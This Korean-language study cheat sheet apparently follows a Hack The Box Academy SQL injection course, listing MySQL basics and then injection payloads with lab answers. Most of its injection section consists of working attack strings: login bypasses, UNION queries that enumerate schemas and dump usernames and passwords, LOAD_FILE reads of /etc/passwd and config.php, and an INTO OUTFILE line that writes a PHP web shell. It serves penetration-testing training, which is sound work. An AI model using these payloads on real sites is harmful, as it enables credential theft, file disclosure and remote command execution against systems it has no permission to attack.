# SQL 주입 기초

## SQL 주입 기초



> [소개](https://academy.hackthebox.com/module/33/section/177)

### MySQL



| **명령**                                                                                       | **설명**                                                                                              |
| -------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| **일반적인**                                                                                     |                                                                                                     |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p`                                           | mysql 데이터베이스에 로그인 [MySQL 소개](https://academy.hackthebox.com/module/33/section/183)                  |
| `SHOW DATABASES`                                                                             | 사용 가능한 데이터베이스 나열                                                                                    |
| `USE users`                                                                                  | 데이터베이스로 전환                                                                                          |
| **테이블**                                                                                      |                                                                                                     |
| `CREATE TABLE logins (id INT, ...)`                                                          | 새 테이블 추가                                                                                            |
| `SHOW TABLES`                                                                                | 현재 데이터베이스에서 사용 가능한 테이블 나열                                                                           |
| `DESCRIBE logins`                                                                            | 테이블 속성 및 열 표시                                                                                       |
| `INSERT INTO table_name VALUES (value_1,..)`                                                 | 테이블에 값 추가                                                                                           |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)`                            | 테이블의 특정 열에 값 추가                                                                                     |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>`                             | 테이블 값을 업데이트합니다. 참고: 업데이트할 레코드를 지정하려면 UPDATE를 사용하여 'WHERE' 절을 지정해야 합니다. 'WHERE' 절에 대해서는 다음에 설명하겠습니다. |
| **열**                                                                                        |                                                                                                     |
| `SELECT * FROM table_name`                                                                   | 테이블의 모든 열 표시                                                                                        |
| `SELECT column1, column2 FROM table_name`                                                    | 테이블의 특정 열 표시                                                                                        |
| `DROP TABLE logins`                                                                          | 테이블 삭제                                                                                              |
| `ALTER TABLE logins ADD newColumn INT`                                                       | 새 열 추가                                                                                              |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn`                                    | 열 이름 바꾸기                                                                                            |
| `ALTER TABLE logins MODIFY oldColumn DATE`                                                   | 열 데이터 유형 변경                                                                                         |
| `ALTER TABLE logins DROP oldColumn`                                                          | 열 삭제                                                                                                |
| **산출**                                                                                       |                                                                                                     |
| `SELECT * FROM logins ORDER BY column_1`                                                     | 열을 기준으로 정렬                                                                                          |
| `SELECT * FROM logins ORDER BY column_1 DESC`                                                | 열을 기준으로 내림차순으로 정렬                                                                                   |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC`                                        | 2열로 정렬                                                                                              |
| `SELECT * FROM logins LIMIT 2`                                                               | 처음 두 결과만 표시                                                                                         |
| `SELECT * FROM logins LIMIT 1, 2`                                                            | [인덱스 2 쿼리 결과](https://academy.hackthebox.com/module/33/section/191) 부터 처음 두 개의 결과만 표시               |
| `SELECT * FROM table_name WHERE <condition>`                                                 | 조건을 충족하는 결과 나열                                                                                      |
| `SELECT * FROM logins WHERE username LIKE 'admin%'`                                          | 이름이 주어진 문자열과 유사한 결과 나열                                                                              |
| `select * from departments where dept_name like 'Develop%';`                                 | 부서 의 부서 번호를 가져옵니다 `Development`.                                                                    |
| `select * from employees where first_name like 'Bar%' and hire_date = '1990-01-01' LIMIT 2;` | 이름이 "Bar"로 시작하고 에 고용된 직원의 성을 검색하세요 `1990-01-01`.                                                    |

### MySQL 연산자 우선순위



> [SQL 연산자](https://academy.hackthebox.com/module/33/section/192)

* 나눗셈( `/`), 곱셈( `*`), 모듈러스( `%`)
* 덧셈( `+`)과 뺄셈( `-`)
* 비교 ( `=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* 아니다 ( `!`)
* 그리고 ( `&&`)
* 또는 ( `||`)

> 질의: '제목' 테이블에서 직원 번호가 다음 보다 **크** `10000` **거나** 직위에 가 포함 되지 **않은**`engineer` 레코드의 수는 무엇입니까 ?

```
select * from titles WHERE emp_no > 10000 OR title != 'engineer%';
```

### SQL 주입



> [SQL 주입 소개 및 SQL 주입 유형](https://academy.hackthebox.com/module/33/section/193)

#### SQLi 식별



| **유효 탑재량** | **URL 인코딩됨** |
| ---------- | ------------ |
| `'`        | %27          |
| `"`        | %22          |
| `#`        | %23          |
| `;`        | %3B          |
| `)`        | %29          |

| **유효 탑재량**                                                                                                          | **설명**                                                                            |
| ------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------- |
| **인증 우회**                                                                                                           |                                                                                   |
| `admin' or '1'='1`                                                                                                  | 기본 인증 우회 [쿼리 논리 파괴 - 인증 우회](https://academy.hackthebox.com/module/33/section/194) |
| `tom' or '1'='1`                                                                                                    | 사용자 'tom'으로 로그인합니다.                                                               |
| `admin')-- -`                                                                                                       | 댓글로 기본 인증 우회 [댓글 사용](https://academy.hackthebox.com/module/33/section/799)        |
| \`모든' 또는 ID =5);#                                                                                                   | 플래그를 얻으려면 ID 5를 가진 사용자로 로그인하십시오.                                                  |
| [인증 우회 페이로드](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) | PayloadsAllTheThings SQL 삽입 예                                                     |

> 'mysql' 도구를 사용하여 MySQL 서버에 접속하고 'employees' 테이블의 모든 레코드와 'departments' 테이블의 모든 레코드를 'Union'할 때 반환되는 레코드 수를 찾습니다.

```
SELECT COUNT(*) AS total_records 
FROM
  (SELECT 'employees' AS source_table, emp_no, birth_date, first_name, last_name, gender, hire_date, NULL AS dept_no, NULL AS dept_name FROM employees
   UNION
   SELECT 'departments' AS source_table, NULL AS emp_no, NULL AS birth_date, NULL AS first_name, NULL AS last_name, NULL AS gender, NULL AS hire_date, dept_no, dept_name FROM departments) AS combined_table;
```

[![SQL-Union-절](https://github.com/missteek/cpts-quick-references/raw/main/images/sql-Union-Clause.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/sql-Union-Clause.png)

> `NULL`이 쿼리에서는 테이블 중 하나에 없는 열에 대한 자리 표시자를 추가했습니다 . 이제 오류 없이 실행되어야 하며, 두 테이블의 UNION을 수행한 후 반환된 총 레코드 수를 제공합니다.

| **유효 탑재량**                                                                                                                  | **설명**                                                                                                                                        |
| --------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| **유니온 주입**                                                                                                                  | [UNION을 이용한 SQL 인젝션 방법론, 컬럼 개수 감지부터 인젝션 위치 파악까지](https://academy.hackthebox.com/module/33/section/216)                                        |
| `' order by 1-- -`                                                                                                          | 다음을 사용하여 열 수를 감지합니다.`order by`                                                                                                                |
| `cn' UNION select 1,2,3-- -`                                                                                                | Union 주입을 사용하여 열 수를 감지합니다. 알림: (--) 뒤에 공백이 있음을 표시하기 위해 끝에 대시(-)를 추가하고 있습니다. [결합 조항 - 열](https://academy.hackthebox.com/module/33/section/806) |
| `cn' UNION select 1,@@version,3,4-- -`                                                                                      | 기본 Union 주입, 알림: (--) 뒤에 공백이 있음을 표시하기 위해 끝에 대시(-)를 추가하고 있습니다.                                                                                 |
| `UNION select username, 2, 3, 4 from passwords-- -`                                                                         | 4개 열에 대한 유니온 주입                                                                                                                               |
| **DB 열거**                                                                                                                   |                                                                                                                                               |
| `SELECT @@version`                                                                                                          | 쿼리 출력 [데이터베이스 열거 기능을 갖춘 지문 MySQL](https://academy.hackthebox.com/module/33/section/217)                                                       |
| `SELECT SLEEP(5)`                                                                                                           | 출력이 없는 지문 MySQL                                                                                                                               |
| `cn' UNION select 1,database(),2,3-- -`                                                                                     | 현재 데이터베이스 이름                                                                                                                                  |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`                                                   | 모든 데이터베이스 나열                                                                                                                                  |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`                  | 특정 데이터베이스의 모든 테이블 나열                                                                                                                          |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | 특정 테이블의 모든 열 나열                                                                                                                               |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -`                                                        | 다른 데이터베이스의 테이블에서 데이터 덤프                                                                                                                       |

> 'ilfreight' 데이터베이스의 'users' 테이블에 저장된 'newuser'의 비밀번호 해시는 무엇입니까?

```
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
```

> `ilfreight.users`특정 컬럼을 추출하기 위해 테이블 ​​이름 앞에 데이터베이스 이름을 배치합니다 `username,password`.

```
cn' UNION select 1,username,password,4 from ilfreight.users-- -
```

[![sqli-데이터-추출](https://github.com/missteek/cpts-quick-references/raw/main/images/sqli-data-extract.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/sqli-data-extract.png)

| **유효 탑재량**                                                                                                                                 | **설명**                                                                                                    |
| ------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------- |
| **권한**                                                                                                                                     |                                                                                                           |
| `cn' UNION SELECT 1, user(), 3, 4-- -`                                                                                                     | 웹 애플리케이션에서 SQL 서비스 쿼리를 실행 중인 현재 사용자를 찾습니다. [유니온 주입](https://academy.hackthebox.com/module/33/section/216) |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`                                                               | 사용자에게 관리자 권한이 있는지 확인합니다. [사용자 권한](https://academy.hackthebox.com/module/33/section/792)                   |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -`                  | 모든 사용자 권한이 있는지 확인                                                                                         |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | MySQL을 통해 액세스할 수 있는 디렉터리 찾기                                                                               |

| **유효 탑재량**                                                                                                | **설명**                                                                                             |
| --------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| **파일 주입**                                                                                                 |                                                                                                    |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                  | 로컬 파일 읽기                                                                                           |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`                              | 로컬 파일에 문자열 쓰기                                                                                      |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | 기본 웹 디렉터리에 웹 셸을 작성합니다. [파일 쓰기 - 대상에 웹 셸 만들기](https://academy.hackthebox.com/module/33/section/793) |

> 다음을 사용하여 소스 코드를 검색합니다.`load_file`

```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

> 위 소스에서 파일을 가져온 `include`줄 상태를 볼 수 있습니다.`config.php`

```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

[![SQLi 로드 파일](https://github.com/missteek/cpts-quick-references/raw/main/images/SQLi-load-file.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/SQLi-load-file.png)
